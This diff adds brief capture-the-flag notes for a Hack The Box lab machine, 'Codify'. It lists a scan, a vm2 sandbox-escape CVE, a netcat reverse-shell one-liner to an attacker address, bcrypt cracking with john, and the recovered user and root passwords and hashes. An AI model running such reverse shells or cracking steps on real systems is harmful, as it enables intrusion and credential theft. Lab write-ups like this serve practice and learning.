@@ -1,0 +1,20 @@
+1. Scanning
+      nmap -sC -sV codify.htb -o scan.txt
+
+2. Found code compiler and cve of vm2 that codify used
+      PoC: https://gist.github.com/leesh3288/381b230b04936dd4d74aaf90cc8bb244
+      CVE-2023-30547
+
+3. reverse shell script
+    rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.33 4444 >/tmp/f
+
+4. Found hash.txt in /var/www/contacts
+john --format=bcrypt --wordlist=/home/loizha/rockyou.txt hash.txt
+$2a$12$SOn8Pf6z8fO/nVsNbAAequ/P6vLRJJl7gCUEiYBU2iLHn4G/p/Zw2
+
+5. Found python script in joshua dir LoL
+
+joshua   spongebob1                     915ca5f8dceaff28e5a33e02f101d710
+root     kljh12k3jhaskjh12kjh3          2b7e76148776261bcc0990a720e3267c
+
+https://www.hackthebox.com/achievement/machine/1509321/574
